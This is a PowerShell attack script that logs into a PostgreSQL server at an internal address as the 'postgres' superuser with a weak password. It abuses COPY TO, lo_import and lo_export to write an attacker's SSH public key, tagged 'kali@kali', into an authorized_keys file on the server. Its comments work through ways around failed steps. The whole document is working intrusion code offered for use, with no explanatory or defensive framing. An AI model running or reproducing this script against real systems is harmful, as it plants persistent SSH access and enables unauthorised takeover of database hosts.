$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
try {
    $c.Open()
    Write-Host "CONNECTED"
    
    # Write key to /tmp via COPY TO
    $cmd=$c.CreateCommand()
    $cmd.CommandText="CREATE TEMP TABLE ssh_key(k text)"
    $cmd.ExecuteNonQuery() | Out-Null
    
    $cmd2=$c.CreateCommand()
    $cmd2.CommandText="INSERT INTO ssh_key VALUES('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIkFBfoRyItDwN4LzpB8/7rMu3OgdoPxD01TWchngZYl kali@kali')"
    $cmd2.ExecuteNonQuery() | Out-Null
    
    $cmd3=$c.CreateCommand()
    $cmd3.CommandText="COPY ssh_key TO '/tmp/ak.txt'"
    $cmd3.ExecuteNonQuery() | Out-Null
    Write-Host "KEY_WRITTEN_TO_TMP"
    
    # Now use COPY FROM PROGRAM to mkdir and move
    # Can't use COPY FROM PROGRAM (ODBC disconnects). Try lo_export instead.
    
    # Use lo_import to load our key file as large object, then lo_export to target
    $cmd4=$c.CreateCommand()
    $cmd4.CommandText="SELECT lo_import('/tmp/ak.txt')"
    $r=$cmd4.ExecuteReader()
    $oid=$null
    while($r.Read()){$oid=$r[0]; Write-Host ("OID:"+$oid)}
    $r.Close()
    
    if($oid) {
        # mkdir via pg_file_write to a fake path won't work
        # Instead, use lo_export to /var/lib/postgresql/.ssh/authorized_keys
        # But .ssh dir must exist first...
        
        # Try writing to pg data dir which postgres owns
        $cmd5=$c.CreateCommand()
        $cmd5.CommandText="SELECT lo_export($oid, '/mnt/extdisk1/data/pg/data/16/authorized_keys')"
        $r5=$cmd5.ExecuteReader()
        while($r5.Read()){Write-Host ("EXPORT:"+$r5[0])}
        $r5.Close()
        Write-Host "KEY_EXPORTED"
    }
    
} catch {
    Write-Host ("ERR:"+$_)
}
$c.Close()
